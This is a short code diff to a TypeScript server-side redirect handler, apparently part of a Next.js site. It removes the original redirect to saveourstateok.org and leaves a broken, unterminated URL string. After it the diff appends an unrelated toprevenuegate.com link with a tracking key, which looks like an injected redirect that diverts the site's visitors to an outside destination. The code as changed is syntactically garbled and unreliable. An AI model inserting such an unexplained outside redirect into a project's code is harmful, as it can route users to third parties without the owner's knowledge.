@@ -19,8 +19,8 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
-				}`,
+					`https://
+				}`,https://www.toprevenuegate.com/c46n1q7zx6?key=70dacfd9c59741ee1db586b029d72b1d
 			},
 		};
 		}
